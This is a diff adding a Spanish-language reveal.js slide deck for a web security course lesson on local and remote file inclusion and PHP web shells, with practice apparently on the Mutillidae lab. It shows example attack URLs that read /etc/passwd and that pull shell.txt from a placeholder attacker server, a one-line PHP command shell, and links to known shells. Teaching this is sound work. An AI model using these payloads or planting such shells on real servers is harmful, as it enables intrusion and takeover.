@@ -1,0 +1,227 @@
+<!doctype html>
+<html lang="en">
+
+	<head>
+		<meta charset="utf-8">
+
+		<title>Seguridad Web</title>
+
+		<meta name="author" content="Maximiliano Cañellas">
+
+		<meta name="apple-mobile-web-app-capable" content="yes" />
+		<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+		<link rel="stylesheet" href="css/reveal.min.css">
+		<link rel="stylesheet" href="css/theme/night.css" id="theme">
+
+		<!-- For syntax highlighting -->
+		<link rel="stylesheet" href="lib/css/zenburn.css">
+
+		<!-- If the query includes 'print-pdf', include the PDF print sheet -->
+		<script>
+			if( window.location.search.match( /print-pdf/gi ) ) {
+				var link = document.createElement( 'link' );
+				link.rel = 'stylesheet';
+				link.type = 'text/css';
+				link.href = 'css/print/pdf.css';
+				document.getElementsByTagName( 'head' )[0].appendChild( link );
+			}
+		</script>
+
+		<!--[if lt IE 9]>
+		<script src="lib/js/html5shiv.js"></script>
+		<![endif]-->
+	</head>
+
+	<body>
+
+<div class="reveal">
+
+	<div class="slides">
+		<section>
+			<h2>Seguridad Web</h2>
+			<h2>Clase: 4</h2>
+			<h3>Instituto Educación IT</h3>
+			<h3>Autor: Maximiliano Cañellas</h3>
+		</section>
+
+		<section>
+
+		<section>
+			<h2> Sobre el curso</h2>
+			<h3 class="fragment">Módulo 4/4: Otras vulnerabilidades web </h3>
+			<h3 class="fragment">Temas:</h3>
+				<h4 class="fragment">
+            · Vulnerabilidades LFI/RFI
+            · Shells
+            · Fallas en los sistemas de auth
+            · Gestión correcta de sesiones
+            · Propiedades importantes de las cookies
+            </h4>
+		</section>
+
+		</section>
+
+      <section>
+               <section>
+                  <h2>File Inclusion</h2>
+                  <br/>
+                  <blockquote class="fragment">Un error muy común en varias aplicaciones web es no validar correctamente los mecanismos de inclusión de archivos locales (y, a veces, remotos) implementados por el sitio vulnerable.</blockquote>
+               </section>
+      </section>
+         <section>
+            <section>
+               <h2>Tipos: local File Inclusion (LFI)</h2>
+               <br/>
+
+               <blockquote class="fragment">
+                  Local File Inclusion, o traducido al castellano inclusion local de archivos, se trata de la técnica que mediante una vulnerabilidad de la aplicación nos permite "incluir" o leer archivos locales a los que normalmente no deberiamos tener acceso.
+               </blockquote>
+               <br/>
+               <h4 class="fragment"><a href="https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion">OWASP LFI</a></h4>
+               <br/>
+               <p class="fragment">Un ejemplo: </p>
+
+               <pre class="fragment"><code>www.vulnerable.com/index.php?modulo=about.php</code></pre>
+            </section>
+            <section>
+               <h2>Tipos: Local File Inclusion (LFI)</h2>
+
+                  <h4 class="fragment">En el ejemplo de arriba, podemos suponer que se está cargando la sección “about” o “acerca de”.</h4>
+                  <br/>
+                  <blockquote class="fragment">
+                     La primera prueba que podríamos realizar en este caso sería modificar el contenido de la variable “modulo” y reemplazarla por otro archivo. Hecho esto, veremos si se obtiene algún error por parte del sitio, o si el archivo se incluye correctamente.
+                  </blockquote>
+                  <br/>
+                  <p class="fragment">Uno de los archivos que podríamos intentar incluir, en el caso de tratarse de un servidor gnu/linux, sería “/etc/passwd”, así:</p>
+                  <br/>
+                  <pre class="fragment"><code>www.vulnerable.com/index.php?modulo=/etc/passwd</code></pre>
+            </section>
+
+         </section>
+      <section>
+         <section>
+            <h2>Tipos: Remote File Inclusion (RFI)</h2>
+            <br/>
+            <blockquote class="fragment">RFI (Remote File Inclusion), traducido al español como Inclusión Remota de Archivos - es una vulnerabilidad que puede existir en una aplicación web y que  permite el enlace de archivos remotos situados en otros servidores. Afecta particularmente al lenguaje PHP {función include()}</blockquote>
+            <br/>
+            <h4 class="fragment"><a href="https://www.owasp.org/index.php/Testing_for_Remote_File_Inclusion">OWASP RFI</a></h4>
+            <br/>
+            <p class="fragment">Un ejemplo: </p>
+            <pre class="fragment"><code>http://vulnerable.com/index.php?page=plantilla.html</code></pre>
+
+
+         </section>
+         <section>
+            <h2>Tipos: Remote File Inclusion (RFI)</h2>
+            <br/>
+            <h4 class="fragment">El atacante podrá obtener una Shell en el servidor vulnerable mediante el siguiente comando:</h4>
+            <pre class="fragment"><code>http://vulnerable.com/index.php?page=http://[servidor_atacante]/shell.txt&&cmd=ls</code></pre>
+            <br/>
+            <p class="fragment">Pudiendo contener el archivo shell.txt cualquier código, por ejemplo:</p>
+            <pre class="fragment"><code> system($cmd); </code></pre>
+         </section>
+         <section>
+            <h2>Tipos: Remote File Inclusion (RFI)</h2>
+
+            <blockquote class="fragment">Debemos tener en cuenta que el hecho de que exista una vulnerabilidad Remote File Inclusion no quiere decir que sea posible ejecutar instrucciones en el servidor. Eso depende de los filtros que aplique cada aplicación, pero es muy importante que directamente, no sea posible incluir archivos remotos que no sean validados, porque la falta de validaciones podría hacer que un atacante tenga muchas posibilidades de ataque, independientemente de si puede ejecutar comandos en el servidor o no.</blockquote>
+         </section>
+      </section>
+
+      <section>
+         <section>
+
+            <h2>Shells (PHP)</h2>
+
+            <br/>
+
+            <blockquote class="fragment">Existen varios proyectos para crear una shell de comandos en PHP, con el objetivo de controlar servidores. Muchas veces, esto se hace para tomar el control de servidores que han sido atacados previamente, aunque los administradores legítimos del servidor también podrían instalar este tipo de herramientas, siempre y cuando las mismas cuenten con algún mecanismo de autenticación.</blockquote>
+
+         </section>
+         <section>
+
+            <h2>Shells (PHP)</h2>
+            <br/>
+            <h4 class="fragment">Eventualmente podriamos querer crear nuestra propia shell</h4>
+            <br/>
+            <p class="fragment">Un ejemplo muy simple sería el siguiente:</p>
+            <br/>
+            <pre class="fragment"><code>?php system($_GET['cmd'] ?</code></pre>
+            <br/>
+            <p class="fragment">Lo que hace esta shell es, simplemente, ejecutar los comandos que se le pasen por método GET en la variable 'cmd'.</p>
+            <br/>
+            <p class="fragment">Suponiendo que el archivo de la shell se llame 'shell.php', podemos utilizarla de la siguiente manera:</p>
+            <pre class="fragment"><code>http://vulnerable.com/shell.php?cmd=ls</code></pre>
+            <p class="fragment">Esto ejecutará el comando 'ls' y mostrará su salida por pantalla.</p>
+         </section>
+         <section>
+            <h2>Algunas Shells</h2>
+            <br/>
+            <ul>
+               <li><h4><a href="http://ani-shell.sourceforge.net/">Ani Shell</a></h4></li>
+               <li><h4><a href="http://www.r57.gen.tr/">http://www.r57.gen.tr/</a></h4></li>
+
+            </ul>
+
+         </section>
+
+      </section>
+
+      <section>
+
+      </section>
+      <section>
+
+      </section>
+
+      <section>
+         <h2>Veamos en Mutillidae estos ejemplos de forma práctica</h2>
+         <br/>
+      </section>
+
+      <section>
+         <h2>¡Fin de la clase! :)</h2>
+         <h2>¿Dudas? ¿Preguntas?</h2>
+      </section>
+
+   </div> <!-- slides -->
+
+</div> <!-- reveal -->
+
+		<script src="lib/js/head.min.js"></script>
+		<script src="js/reveal.min.js"></script>
+
+		<script>
+
+			// Full list of configuration options available here:
+			// https://github.com/hakimel/reveal.js#configuration
+			Reveal.initialize({
+				controls: true,
+				progress: true,
+				history: true,
+				center: true,
+
+				theme: Reveal.getQueryHash().theme, // available themes are in /css/theme
+				transition: Reveal.getQueryHash().transition || 'default', // default/cube/page/concave/zoom/linear/fade/none
+
+				// Parallax scrolling
+				// parallaxBackgroundImage: 'https://s3.amazonaws.com/hakim-static/reveal-js/reveal-parallax-1.jpg',
+				// parallaxBackgroundSize: '2100px 900px',
+
+				// Optional libraries used to extend on reveal.js
+				dependencies: [
+					{ src: 'lib/js/classList.js', condition: function() { return !document.body.classList; } },
+					{ src: 'plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
+					{ src: 'plugin/zoom-js/zoom.js', async: true, condition: function() { return !!document.body.classList; } },
+					{ src: 'plugin/notes/notes.js', async: true, condition: function() { return !!document.body.classList; } }
+				]
+			});
+
+		</script>
+
+	</body>
+</html>
